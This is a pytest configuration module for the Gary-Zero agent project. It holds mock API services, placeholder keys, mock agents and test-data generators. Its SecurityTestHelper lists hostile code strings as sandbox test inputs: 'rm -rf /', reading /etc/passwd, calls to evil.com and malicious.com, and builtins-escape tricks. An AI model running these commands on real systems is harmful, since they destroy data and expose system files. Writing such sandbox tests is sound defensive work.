"""
Test environment configuration for Gary-Zero.
Provides mock services and configurations for testing.
"""

import os
import tempfile
from unittest.mock import MagicMock, Mock

import pytest


class TestEnvironment:
    """Test environment configuration and utilities."""

    def __init__(self):
        self.temp_dir = None
        self.mock_services = {}
        self.test_config = {}
        self._setup_test_environment()

    def _setup_test_environment(self):
        """Set up the test environment."""
        # Create temporary directory for test files
        self.temp_dir = tempfile.mkdtemp(prefix="gary_zero_test_")

        # Set test environment variables
        self.test_config = {
            "PORT": "8080",
            "WEB_UI_HOST": "localhost",
            "SEARXNG_URL": "http://localhost:8080/mock-searxng",
            "E2B_API_KEY": "test-e2b-key-12345",
            "OPENAI_API_KEY": "test-openai-key-12345",
            "ANTHROPIC_API_KEY": "test-anthropic-key-12345",
            "GOOGLE_API_KEY": "test-google-key-12345",
            "GROQ_API_KEY": "test-groq-key-12345",
            "MISTRAL_API_KEY": "test-mistral-key-12345",
            "LANGCHAIN_API_KEY": "test-langchain-key-12345",
            "HUGGINGFACE_API_KEY": "test-hf-key-12345",
            "PINECONE_API_KEY": "test-pinecone-key-12345",
            "QDRANT_URL": "http://localhost:6333",
            "REDIS_URL": "redis://localhost:6379",
            "DATABASE_URL": "sqlite:///test.db",
            "SECRET_KEY": "test-secret-key-for-testing-only",
            "TESTING": "true",
            "LOG_LEVEL": "INFO",
            "ENABLE_PERFORMANCE_MONITORING": "true",
            "ENABLE_DEBUG_MODE": "true",
        }

        # Apply test environment variables
        for key, value in self.test_config.items():
            os.environ[key] = value

    def create_mock_api_service(self, service_name: str) -> Mock:
        """Create a mock API service for testing."""
        mock_service = Mock()

        if service_name == "openai":
            mock_service.chat.completions.create = MagicMock(
                return_value=Mock(
                    choices=[
                        Mock(
                            message=Mock(
                                content="This is a mock response from OpenAI API",
                                role="assistant",
                            )
                        )
                    ],
                    usage=Mock(total_tokens=50, prompt_tokens=20, completion_tokens=30),
                )
            )

        elif service_name == "anthropic":
            mock_service.messages.create = MagicMock(
                return_value=Mock(
                    content=[
                        Mock(
                            text="This is a mock response from Anthropic API",
                            type="text",
                        )
                    ],
                    usage=Mock(input_tokens=20, output_tokens=25),
                )
            )

        elif service_name == "e2b":
            mock_service.Sandbox = MagicMock()
            mock_instance = Mock()
            mock_instance.run_code = MagicMock(
                return_value=Mock(
                    stdout="Mock code execution output", stderr="", exit_code=0
                )
            )
            mock_service.Sandbox.return_value = mock_instance

        elif service_name == "searxng":
            mock_service.search = MagicMock(
                return_value={
                    "results": [
                        {
                            "title": "Mock Search Result 1",
                            "url": "https://example.com/result1",
                            "content": "This is a mock search result for testing",
                            "score": 0.95,
                        },
                        {
                            "title": "Mock Search Result 2",
                            "url": "https://example.com/result2",
                            "content": "Another mock search result",
                            "score": 0.87,
                        },
                    ],
                    "query": "test query",
                    "total_results": 2,
                }
            )

        elif service_name == "vector_db":
            mock_service.upsert = MagicMock(return_value={"upserted_count": 1})
            mock_service.query = MagicMock(
                return_value={
                    "matches": [
                        {
                            "id": "test-vector-1",
                            "score": 0.98,
                            "metadata": {"text": "Mock vector search result"},
                        }
                    ]
                }
            )
            mock_service.delete = MagicMock(return_value={"deleted_count": 1})

        self.mock_services[service_name] = mock_service
        return mock_service

    def get_mock_database_session(self):
        """Create a mock database session for testing."""
        mock_session = Mock()
        mock_session.query = MagicMock()
        mock_session.add = MagicMock()
        mock_session.commit = MagicMock()
        mock_session.rollback = MagicMock()
        mock_session.close = MagicMock()
        return mock_session

    def create_test_files(self, files: dict[str, str]) -> dict[str, str]:
        """Create temporary test files."""
        file_paths = {}

        for filename, content in files.items():
            file_path = os.path.join(self.temp_dir, filename)

            # Create directories if needed
            os.makedirs(os.path.dirname(file_path), exist_ok=True)

            with open(file_path, "w", encoding="utf-8") as f:
                f.write(content)

            file_paths[filename] = file_path

        return file_paths

    def cleanup(self):
        """Clean up test environment."""
        import shutil

        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)

        # Reset environment variables
        for key in self.test_config.keys():
            if key in os.environ:
                del os.environ[key]


# Global test environment instance
_test_env = None


def get_test_environment() -> TestEnvironment:
    """Get the global test environment instance."""
    global _test_env
    if _test_env is None:
        _test_env = TestEnvironment()
    return _test_env


@pytest.fixture(scope="session")
def test_environment():
    """Pytest fixture for test environment."""
    env = get_test_environment()
    yield env
    env.cleanup()


@pytest.fixture
def mock_openai_api(test_environment):
    """Mock OpenAI API for testing."""
    return test_environment.create_mock_api_service("openai")


@pytest.fixture
def mock_anthropic_api(test_environment):
    """Mock Anthropic API for testing."""
    return test_environment.create_mock_api_service("anthropic")


@pytest.fixture
def mock_e2b_api(test_environment):
    """Mock E2B API for testing."""
    return test_environment.create_mock_api_service("e2b")


@pytest.fixture
def mock_searxng_api(test_environment):
    """Mock SearXNG API for testing."""
    return test_environment.create_mock_api_service("searxng")


@pytest.fixture
def mock_vector_db(test_environment):
    """Mock vector database for testing."""
    return test_environment.create_mock_api_service("vector_db")


@pytest.fixture
def mock_database_session(test_environment):
    """Mock database session for testing."""
    return test_environment.get_mock_database_session()


@pytest.fixture
def temp_test_files(test_environment):
    """Create temporary test files."""

    def _create_files(files: dict[str, str]) -> dict[str, str]:
        return test_environment.create_test_files(files)

    return _create_files


@pytest.fixture
def mock_performance_metrics():
    """Mock performance metrics for testing."""
    mock_metrics = Mock()
    mock_metrics.record = MagicMock()
    mock_metrics.get_latest = MagicMock(
        return_value=Mock(value=0.1, timestamp=1234567890)
    )
    mock_metrics.get_average = MagicMock(return_value=0.15)
    mock_metrics.get_percentile = MagicMock(return_value=0.2)
    return mock_metrics


class MockAgent:
    """Mock agent for testing multi-agent scenarios."""

    def __init__(self, agent_id: str, capabilities: list = None):
        self.agent_id = agent_id
        self.capabilities = capabilities or []
        self.is_active = True
        self.received_messages = []
        self.sent_messages = []

    async def send_message(self, message):
        """Mock sending a message."""
        self.sent_messages.append(message)
        return True

    async def receive_message(self, message):
        """Mock receiving a message."""
        self.received_messages.append(message)
        # Return a mock response
        return Mock(
            id=f"response-{len(self.received_messages)}",
            type="response",
            content={"status": "processed", "agent_id": self.agent_id},
        )


@pytest.fixture
def mock_agents():
    """Create mock agents for testing."""
    agents = {
        "data-agent": MockAgent("data-agent", ["data_processing", "analytics"]),
        "web-agent": MockAgent("web-agent", ["web_scraping", "api_calls"]),
        "ai-agent": MockAgent("ai-agent", ["llm_calls", "text_generation"]),
        "notification-agent": MockAgent("notification-agent", ["email", "slack"]),
    }
    return agents


# Performance testing utilities
class PerformanceTracker:
    """Track performance metrics during testing."""

    def __init__(self):
        self.metrics = {}
        self.start_times = {}

    def start_timer(self, operation: str):
        """Start timing an operation."""
        import time

        self.start_times[operation] = time.time()

    def end_timer(self, operation: str) -> float:
        """End timing an operation and return duration."""
        import time

        if operation in self.start_times:
            duration = time.time() - self.start_times[operation]
            self.metrics[operation] = duration
            del self.start_times[operation]
            return duration
        return 0.0

    def get_metrics(self) -> dict[str, float]:
        """Get all recorded metrics."""
        return self.metrics.copy()

    def reset(self):
        """Reset all metrics."""
        self.metrics.clear()
        self.start_times.clear()


@pytest.fixture
def performance_tracker():
    """Performance tracker for testing."""
    tracker = PerformanceTracker()
    yield tracker
    tracker.reset()


# Security testing utilities
class SecurityTestHelper:
    """Helper for security-related testing."""

    @staticmethod
    def create_malicious_code_samples() -> dict[str, str]:
        """Create malicious code samples for security testing."""
        return {
            "command_injection": "import os; os.system('rm -rf /')",
            "code_execution": 'eval(\'__import__("os").system("ls")\')',
            "file_access": "open('/etc/passwd', 'r').read()",
            "network_access": "import urllib.request; urllib.request.urlopen('http://malicious.com')",
            "subprocess_abuse": "import subprocess; subprocess.call(['curl', 'http://evil.com'])",
            "dangerous_imports": "import sys, os, subprocess, socket, urllib",
            "attribute_access": "obj.__class__.__bases__[0].__subclasses__()",
            "globals_access": "globals()['__builtins__']['exec']('malicious_code')",
        }

    @staticmethod
    def create_safe_code_samples() -> dict[str, str]:
        """Create safe code samples for testing."""
        return {
            "basic_math": "result = 2 + 2",
            "string_manipulation": "text = 'hello world'.upper()",
            "list_operations": "numbers = [1, 2, 3, 4, 5]; sum(numbers)",
            "function_definition": "def greet(name): return f'Hello, {name}!'",
            "json_processing": 'import json; data = json.loads(\'{"key": "value"}\')',
            "basic_loops": "for i in range(10): print(i)",
            "conditionals": "if True: result = 'condition met'",
        }


@pytest.fixture
def security_test_helper():
    """Security test helper for testing."""
    return SecurityTestHelper()


# Configuration for different test types
TEST_MARKERS = {
    "unit": "Fast isolated tests",
    "integration": "Tests with external dependencies",
    "e2e": "End-to-end tests",
    "performance": "Performance and benchmark tests",
    "security": "Security-related tests",
    "slow": "Tests that take longer than 1 second",
    "mock_external": "Tests that mock external services",
}


def pytest_configure(config):
    """Configure pytest with custom markers."""
    for marker, description in TEST_MARKERS.items():
        config.addinivalue_line("markers", f"{marker}: {description}")


# Test data generators
def generate_test_message_data(count: int = 10) -> list:
    """Generate test message data for A2A communication testing."""
    import uuid
    from datetime import datetime

    messages = []
    for i in range(count):
        messages.append(
            {
                "id": str(uuid.uuid4()),
                "session_id": f"test-session-{i // 3}",
                "sender_id": f"agent-{i % 3}",
                "recipient_id": f"agent-{(i + 1) % 3}",
                "type": ["request", "response", "notification"][i % 3],
                "content": {"action": f"test_action_{i}", "data": {"value": i}},
                "timestamp": datetime.now().isoformat(),
                "correlation_id": f"corr-{i}",
            }
        )

    return messages


def generate_performance_test_data(metric_count: int = 1000) -> list:
    """Generate performance test data."""
    import random
    import time

    metrics = []
    base_time = time.time()

    for i in range(metric_count):
        metrics.append(
            {
                "name": f"test_metric_{i % 10}",
                "value": random.uniform(0.001, 1.0),
                "timestamp": base_time + i * 0.1,
                "tags": {
                    "category": f"cat_{i % 5}",
                    "priority": ["low", "medium", "high"][i % 3],
                },
                "unit": "seconds",
            }
        )

    return metrics
